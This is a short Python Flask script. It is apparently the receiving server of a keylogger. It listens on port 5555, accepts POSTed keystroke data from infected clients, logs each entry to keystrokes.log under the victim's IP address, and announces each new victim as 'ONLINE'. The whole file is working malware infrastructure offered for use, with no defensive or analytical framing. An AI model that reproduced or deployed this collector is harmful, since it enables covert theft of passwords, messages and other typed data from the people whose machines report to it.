import socket
from flask import Flask, request

app = Flask(__name__)

# Automatically fetch the server's IP
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))  # Google's DNS (used to determine outbound IP)
    ip = s.getsockname()[0]
    s.close()
    return ip

SERVER_IP = get_ip()  # Fetch current system IP
PORT = 5555  # Listening port

LOG_FILE = "keystrokes.log"
CLIENTS = set()  # Store connected clients

@app.route("/log", methods=["POST"])
def log_keystrokes():
    client_ip = request.remote_addr  # Get client's IP address
    keystrokes = request.form.get("keystrokes")

    if keystrokes:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{client_ip}] {keystrokes}\n")

        # Notify when client sends data for the first time
        if client_ip not in CLIENTS:
            CLIENTS.add(client_ip)
            print(f"[+] Client {client_ip} is ONLINE!")

        print(f"[✔] Keystrokes received from {client_ip}")

    return "Logged", 200

if __name__ == "__main__":
    print(f"[*] Server is running on http://{SERVER_IP}:{PORT}")
    app.run(host="0.0.0.0", port=PORT)
